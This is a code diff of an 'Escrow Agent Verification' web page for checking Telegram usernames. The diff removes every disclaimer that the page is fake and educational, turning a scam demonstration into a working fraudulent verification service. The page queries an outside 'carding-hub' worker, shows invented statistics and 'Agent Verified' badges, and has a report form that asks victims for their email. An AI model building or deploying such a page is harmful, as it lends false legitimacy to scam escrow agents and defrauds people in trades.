@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Escrow Agent Verification (100% Fake and for educational purposes, to show how scammer scam, anyone can make this)</title>
+    <title>Escrow Agent Verification</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * {
@@ -545,29 +545,29 @@
                     </svg>
                 </div>
                 <h1 class="title">Escrow Agent Verification</h1>
-                <p class="subtitle">Only For Demo (It's Fake, and only for educational purposes): Enter the Agent's Telegram username and verify it. (Its fake and anyone can make)</p>
+                <p class="subtitle">Enter the Agent's Telegram username and verify it.</p>
             </div>
 
             <form class="form" id="verificationForm">
                 <div class="form-group">
-                    <label for="username" class="label">Telegram Username (It's fake and for educational purposes)</label>
+                    <label for="username" class="label">Telegram Username</label>
                     <div class="input-container">
                         <input
                             type="text"
                             id="username"
                             class="input"
-                            placeholder="Enter username (It's fake)"
+                            placeholder="Enter username"
                             required
                         />
                         <svg class="input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                             <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
                         </svg>
                     </div>
-                    <p class="helper-text">Total Registered Agents: 27,622 (This is also fake, and a random number)</p>
+                    <p class="helper-text">Total Registered Agents: 27,622</p>
                 </div>
 
                 <button type="submit" class="button" id="submitButton">
-                    <span id="buttonText">Verify Agent (THis is also fake)</span>
+                    <span id="buttonText">Verify Agent</span>
                     <div class="loading-spinner hidden" id="loadingSpinner"></div>
                 </button>
             </form>
@@ -584,11 +584,11 @@
                 </div>
                 <div class="notification-body">
                     <div class="notification-header">
-                        <h3 class="notification-title success">Agent Verified(This is also fake)</h3>
+                        <h3 class="notification-title success">Agent Verified</h3>
                         <button class="notification-close" onclick="hideNotification('success')">✕</button>
                     </div>
                     <div class="notification-details"></div>
-                    <button class="report-button" onclick="openReportModal()">Report Agent (Everthing is fake here, and this is how scamer scam)</button>
+                    <button class="report-button" onclick="openReportModal()">Report Agent</button>
                 </div>
             </div>
         </div>
@@ -607,7 +607,7 @@
                         <h3 class="notification-title error">Agent Not Found</h3>
                         <button class="notification-close" onclick="hideNotification('error')">✕</button>
                     </div>
-                    <p class="notification-message">This agent is not registered; please verify the username, as it may be fraudulent. (This is also fake)</p>
+                    <p class="notification-message">This agent is not registered; please verify the username, as it may be fraudulent. </p>
                 </div>
             </div>
         </div>
@@ -616,21 +616,21 @@
     <div class="modal-overlay hidden" id="reportModal">
         <div class="modal-content">
             <div class="modal-header">
-                <h2 class="modal-title">Report Agent (Totally fake and for educational purposes only)</h2>
-                <p class="modal-subtitle">Please describe your concern below (This is how scammer scam)</p>
+                <h2 class="modal-title">Report Agent</h2>
+                <p class="modal-subtitle">Please describe your concern below</p>
             </div>
             <div class="form-group">
                 <textarea 
                     id="reportText" 
                     class="textarea" 
-                    placeholder="(This is a fake page)Please provide your Email first. So we can reach out to you. Then Write your issue... (This is 100% fake)"
+                    placeholder="Please provide your Email first. So we can reach out to you. Then Write your issue..."
                     maxlength="10000"
                 ></textarea>
                 <div class="char-counter" id="charCounter">0 / 10,000 characters</div>
             </div>
             <div class="modal-actions">
                 <button class="modal-button cancel" onclick="cancelReport()">Cancel</button>
-                <button class="modal-button submit" id="submitReport" onclick="submitReport()">Submit (Fake button)</button>
+                <button class="modal-button submit" id="submitReport" onclick="submitReport()">Submit</button>
             </div>
         </div>
     </div>
@@ -642,8 +642,8 @@
                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                 </svg>
             </div>
-            <h3 class="success-popup-title">Report Submitted Successfully (Anyone can make this and this is how scammer scam)</h3>
-            <p class="success-popup-subtitle">Thank you for your feedback (This is only for educational purposes and it's totally fake)</p>
+            <h3 class="success-popup-title">Report Submitted Successfully</h3>
+            <p class="success-popup-subtitle">Thank you for your feedback</p>
         </div>
     </div>
 
@@ -661,8 +661,7 @@
         const successPopup = document.getElementById('successPopup');
         const submitReportBtn = document.getElementById('submitReport');
 
-        const agents = {
-        };
+        const agents = {        };
 
         const detailsContainer = successNotification.querySelector(".notification-details");
 
@@ -683,7 +682,7 @@
 
             setLoading(true);
 
-let result = { found: false };
+            let result = { found: false };
 try {
     const [res] = await Promise.all([
         fetch("https://agent-check.carding-hub99.workers.dev", {
@@ -700,20 +699,21 @@ try {
 
 setLoading(false);
 
-if (result.found) {
-    const agent = result.agent;
-    detailsContainer.innerHTML = `
-        <div><strong>Telegram:</strong> ${agent.telegram}</div>
-        <div><strong>License No.:</strong> ${agent.license}</div>
-        <div><strong>Agent Name:</strong> ${agent.name}</div>
-        <div><strong>Escrow Mode:</strong> ${agent.mode}</div>
-        <div><strong>Successful Trades:</strong> ${agent.trades}</div>
-        <div><strong>License For:</strong> ${agent.licenseFor}</div>
-    `;
-    showNotification('success');
-} else {
-    showNotification('error');
-}
+            
+            if (result.found) {
+                const agent = result.agent;
+                detailsContainer.innerHTML = `
+                    <div><strong>Telegram:</strong> ${agent.telegram}</div>
+                    <div><strong>License No.:</strong> ${agent.license}</div>
+                    <div><strong>Agent Name:</strong> ${agent.name}</div>
+                    <div><strong>Escrow Mode:</strong> ${agent.mode}</div>
+                    <div><strong>Successful Trades:</strong> ${agent.trades}</div>
+                    <div><strong>License For:</strong> ${agent.licenseFor}</div>
+                `;
+                showNotification('success');
+            } else {
+                showNotification('error');
+            }
         });
 
         function setLoading(isLoading) {
